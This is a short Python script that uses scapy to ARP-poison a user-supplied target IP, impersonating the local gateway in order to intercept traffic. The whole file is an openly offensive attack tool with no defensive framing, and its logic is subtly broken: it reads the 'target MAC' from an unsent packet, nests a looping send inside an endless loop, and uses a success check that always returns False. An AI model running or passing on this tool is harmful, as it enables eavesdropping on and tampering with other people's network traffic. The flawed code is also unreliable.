import os
import sys
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send
# from scapy.all import *


def arp_poison(target_ip, gateway_ip):
    # Get MAC address of target
    target_mac = ARP(pdst=target_ip).hwsrc
    # print(target_mac)

    # Construct ARP packet
    arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

    # Send packet
    while True:
        send(arp, verbose=0, inter=1, loop=1)

        if poisoning_is_successfull():
            break


def poisoning_is_successfull():
    return False


def get_gateway_ip():
    # Determine the OS
    platform_id = sys.platform

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


if __name__ == '__main__':
    target = input("Enter the target IP: ")
    gateway = get_gateway_ip()

    arp_poison(target, gateway)
